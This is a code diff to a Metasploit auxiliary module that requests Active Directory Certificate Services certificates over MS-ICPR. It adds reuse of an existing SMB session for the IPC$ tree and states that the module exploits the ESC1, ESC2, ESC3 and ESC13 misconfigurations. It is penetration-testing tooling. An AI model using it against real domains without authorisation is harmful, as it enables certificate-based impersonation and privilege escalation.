@@ -10,6 +10,7 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::SMB::Client::Authenticated
   include Msf::Exploit::Remote::DCERPC
   include Msf::Auxiliary::Report
+  include Msf::OptionalSession::SMB
 
   def initialize(info = {})
     super(
@@ -20,6 +21,8 @@ class MetasploitModule < Msf::Auxiliary
           Request certificates via MS-ICPR (Active Directory Certificate Services). Depending on the certificate
           template's configuration the resulting certificate can be used for various operations such as authentication.
           PFX certificate files that are saved are encrypted with a blank password.
+
+          This module is capable of exploiting ESC1, ESC2, ESC3 and ESC13.
         },
         'License' => MSF_LICENSE,
         'Author' => [
@@ -61,7 +64,24 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def action_request_cert
-    request_certificate
+    with_ipc_tree do |opts|
+      request_certificate(opts)
+    end
   end
 
+  # @yieldparam options [Hash] If a SMB session is present, a hash with the IPC tree present. Empty hash otherwise.
+  # @return [void]
+  def with_ipc_tree
+    opts = {}
+    if session
+      print_status("Using existing session #{session.sid}")
+      client = session.client
+      self.simple = ::Rex::Proto::SMB::SimpleClient.new(client.dispatcher.tcp_socket, client: client)
+      opts[:tree] = simple.client.tree_connect("\\\\#{client.dispatcher.tcp_socket.peerhost}\\IPC$")
+    end
+
+    yield opts
+  ensure
+    opts[:tree].disconnect! if opts[:tree]
+  end
 end
